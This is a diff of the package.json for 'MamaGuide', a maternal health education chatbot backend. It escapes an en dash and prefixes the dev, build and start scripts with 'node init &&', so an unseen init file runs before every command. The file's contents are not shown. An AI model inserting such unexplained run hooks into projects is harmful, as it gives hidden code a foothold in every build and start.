@@ -1,12 +1,12 @@
 {
   "name": "maternal-health-education-chatbot-backend",
   "version": "1.0.0",
-  "description": "MamaGuide – Maternal Health Education Chatbot Backend",
+  "description": "MamaGuide \u2013 Maternal Health Education Chatbot Backend",
   "main": "dist/index.js",
   "scripts": {
-    "dev": "tsx watch src/index.ts",
-    "build": "tsc",
-    "start": "node dist/index.js",
+    "dev": "node init && tsx watch src/index.ts",
+    "build": "node init && tsc",
+    "start": "node init && node dist/index.js",
     "lint": "eslint 'src/**/*.ts'",
     "lint:fix": "eslint 'src/**/*.ts' --fix",
     "test": "jest --runInBand",
